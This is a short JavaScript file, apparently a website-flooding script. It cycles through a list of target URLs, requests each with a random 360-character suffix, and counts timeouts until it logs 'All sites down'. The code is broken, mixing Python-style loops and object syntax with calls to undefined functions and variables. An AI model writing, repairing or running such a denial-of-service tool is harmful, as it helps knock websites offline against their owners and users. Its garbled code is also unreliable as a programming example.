function timeout(ms, promise) {
	return new Promise(function(resolve, reject) {
		setTimeout(function() {
			reject(new Error("timeout"));
		}, ms);

		promise.then(resolve, reject);
	});
}


function randomString() {
	const chars = "1234567890QWERTYUIOASDFGHJKLPZXCVBNM";
	var randomString = "";
	for (var c = 0; c < 360; c++) {
		randomString += chars[Math.floor(Math.random() * chars.length)];
	}

	return randomString;
}

function nextSite(site, sitesLen) {
	site++;
	if (site == sitesLen) {
		site = 0;
	}
	return site
}

const getWebsites = function(sites) {
	var websites = [];

	for site in sites {
		websites.append({
			url = site,
			timeouts = 0,
		});
	}

	return websites
}

const startSpamSites = function(sites) {
	console.log('beggining the spamming process');
	spamSites(getWebsites(sites), 0, 0)
}

const spamSites = function(websites, site, i) {
	if (websites[site].timeouts > 5) {
		if (site == websites.length) {
          	console.log("All sites down");
			return;
		}	
		site++;
	}

	if (go == false) {
		return;
	}

	timeout(10000, fetch(websites[site].url + randomString())).then(result => {
		console.log(i, result);
		i++;
		
		setTimeout(function() {
			site = nextSite(site, websites.len);
			requester();
		}, 100);
	}).catch(function(error) {
		websites[site].timeouts++;
		console.log("Timeout error for " + websites[site].url);

		setTimeout(function() {
			site = nextSite(site, websites.len);
			spamSites(websites, site, i);
		}, 100);
	});
};

